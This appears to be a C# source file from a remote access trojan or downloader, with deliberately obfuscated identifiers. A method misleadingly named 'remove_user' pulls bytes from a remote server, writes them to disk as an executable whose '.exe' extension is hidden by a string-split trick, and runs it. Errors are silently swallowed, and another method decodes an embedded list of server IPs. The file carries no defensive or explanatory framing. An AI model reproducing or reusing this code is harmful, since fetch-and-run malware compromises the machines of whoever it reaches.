using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;

namespace emrdhorausi;

internal class ORDMR
{
	public MREDM server;

	public ORDMR(MREDM lID)
	{
		server = lID;
	}

	public void emrdhorausiremove_user()
	{
		try
		{
			byte[] bytes = server.emrdhorausipull_data();
			string text = DAONIF.emrdhorausiget_mpath() + DAONIF.emrdhorausiremvUser + ".exe|emrdhorausi".Split(new char[1] { '|' })[0];
			if (!File.Exists(text))
			{
				File.WriteAllBytes(text, bytes);
				Process.Start(text);
			}
		}
		catch
		{
		}
	}

	public NetworkStream emrdhorausiNS(TcpClient emrdhorausitcpsck)
	{
		return emrdhorausitcpsck.GetStream();
	}

	public string emrdhorausiserverIPD()
	{
		return Encoding.UTF8.GetString(DAONIF.emrdhorausivpsips, 0, DAONIF.emrdhorausivpsips.Length);
	}
}
